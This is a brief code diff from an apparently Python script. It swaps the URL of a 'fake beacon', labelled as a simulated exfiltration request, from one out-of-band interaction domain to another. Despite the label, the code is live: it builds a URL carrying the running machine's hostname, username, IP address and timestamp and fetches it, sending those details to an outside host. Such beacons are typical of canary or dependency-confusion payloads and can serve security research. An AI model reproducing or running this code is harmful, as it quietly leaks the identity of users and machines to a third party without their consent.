@@ -20,7 +20,7 @@ ip = socket.gethostbyname(socket.gethostname())
 timestamp = datetime.utcnow().isoformat()
 
 # Fake beacon (simulate HTTP GET to exfil URL)
-beacon_url = f"https://cvdu90ec7hjk23mhqhkghcgd6df7ac1qu.oast.me/{hostname}/{user}/{ip}/{timestamp}"
+beacon_url = f"https://cvdui3ec7hjk4nc26k50zn839tzhnfbtt.oast.site/{hostname}/{user}/{ip}/{timestamp}"
 
 try:
     req = urllib.request.urlopen(beacon_url, timeout=3)
